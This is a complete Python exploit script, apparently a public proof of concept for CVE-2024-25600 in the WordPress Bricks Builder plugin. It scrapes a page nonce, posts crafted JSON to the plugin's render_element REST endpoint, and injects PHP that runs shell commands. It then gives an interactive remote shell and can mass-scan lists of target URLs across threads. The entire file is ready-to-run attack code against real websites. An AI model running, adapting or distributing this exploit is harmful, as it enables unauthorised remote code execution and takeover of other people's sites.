#!/bin/python3

import re
import requests
import argparse
import threading
from bs4 import BeautifulSoup
from rich.console import Console
from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from concurrent.futures import ThreadPoolExecutor, as_completed
from alive_progress import alive_bar

color = Console()

def ascii_art():
    color.print("""[yellow]
   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
 / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
    [/yellow]""", style="bold")
    print("Coded By: K3ysTr0K3R --> Hello, Friend!")
    print("")

headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Mobile Safari/537.36"
}

paths = [
    "/wp-json/bricks/v1/render_element",
    "/?rest_route=/bricks/v1/render_element"
]

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def fetch_nonce(target):
    try:
        response = requests.get(target, verify=False, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        script_tag = soup.find("script", id="bricks-scripts-js-extra")
        if script_tag:
            match = re.search(r'"nonce":"([a-f0-9]+)"', script_tag.string)
            if match:
                nonce = match.group(1)
                return nonce
    except Exception:
        return None

def interactive_shell(target, nonce):
    color.print("[bold bright_green][+][/bold bright_green] Interactive shell opened successfully")
    session = PromptSession(history=InMemoryHistory())

    for vulnerable_path in paths:
        while True:
            try:
                command = session.prompt(
                    HTML("<ansired><b>Shell> </b></ansired>"),
                    auto_suggest=AutoSuggestFromHistory(),
                )
                if command.lower() == "exit":
                    return
                vulnerable_data = create_vulnerable_data(nonce, command)
                response = requests.post(target + vulnerable_path, headers=headers, json=vulnerable_data, verify=False, timeout=10)
                output = response.json().get('data').get('html')
                cleaned_output = output.replace("Exception: ", "")
                print(cleaned_output)
            except KeyboardInterrupt:
                return

def create_vulnerable_data(nonce, command):
    return {
        "postId": "1",
        "nonce": nonce,
        "element": {
            "name": "code",
            "settings": {
                "executeCode": "true",
                "code": f"<?php throw new Exception(`{command}`);?>"
            }
        }
    }

def exploit(target):
    nonce = fetch_nonce(target)
    if nonce:
        elements = [create_element(nonce) for _ in range(4)]

        for path, element in zip(paths, elements):
            if exploit_successful(target, path, element):
                interactive_shell(target, nonce)
                break

def exploit_successful(target, path, element):
    color.print("[bold bright_blue][*][/bold bright_blue] Checking if the target is vulnerable")
    try:
        response = requests.post(target + path, headers=headers, json=element, verify=False, timeout=10)
        response.raise_for_status()
        if response.status_code == 200 and 'KHABuhwxnUHDDW' in response.text:
            color.print("[bold bright_green][+][/bold bright_green] The target is vulnerable")
            color.print(f"[bold bright_blue][*][/bold bright_blue] Initiating exploit against: [bold cyan]{target}[/bold cyan]")
            color.print("[bold bright_blue][*][/bold bright_blue] Initiating interactive shell")
            return True
        else:
            color.print("[bold bright_red][~][/bold bright_red] The target does not appear to be vulnerable")
            exit()
    except requests.exceptions.HTTPError:
        color.print("[bold bright_red][~][/bold bright_red] The target does not appear to be vulnerable")
        return False

def create_element(nonce):
    return {
        "postId": "1",
        "nonce": nonce,
        "element": {
            "name": "container",
            "settings": {
                "hasLoop": "true",
                "query": {
                    "useQueryEditor": True,
                    "queryEditor": "throw new Exception(`echo KHABuhwxnUHDDW`);",
                    "objectType": "post"
                }
            }
        }
    }

def scanner(target, nonce):
    for path in paths:
        try:
            response = requests.post(target + path, headers=headers, json=create_element(nonce), verify=False, timeout=10)
            response.raise_for_status()
            if response.status_code == 200 and 'KHABuhwxnUHDDW' in response.text:
                color.print(f"[bold bright_green][+][/bold bright_green] Identified vulnerability in target: [bold cyan]{target}[/bold cyan]")
                break
        except Exception:
            pass

def threaded_scanner(url, nonce):
    if nonce:
        scanner(url, nonce)

def scan_file(target_file, threads):
    with open(target_file, "r") as url_file:
        urls = [url.strip() for url in url_file if url.strip()]
        if not urls:
            color.print("[bold bright_red][~][/bold bright_red] No URLs found in the file.")
            return

    max_threads = threads
    semaphore = threading.Semaphore(value=max_threads)

    def thread_task(url):
        nonce = fetch_nonce(url)
        with semaphore:
            threaded_scanner(url, nonce)
            bar()

    threads = []
    with alive_bar(len(urls), title="Scanning Targets", bar="smooth", enrich_print=False) as bar:
        for url in urls:
            thread = threading.Thread(target=thread_task, args=(url,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

def main():
    ascii_art()
    parser = argparse.ArgumentParser(description='A PoC exploit for CVE-2024-25600 - WordPress Bricks Builder Remote Code Execution (RCE)')
    parser.add_argument('-u', '--url', help='Target URL to exploit')
    parser.add_argument('-t', '--threads', type=int, default=1, help='Adjust threading to your needs')
    parser.add_argument('-f', '--file', help='File containing URLs to scan')

    args = parser.parse_args()
    if args.url:
        exploit(args.url)
    elif args.file:
        scan_file(args.file, args.threads)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
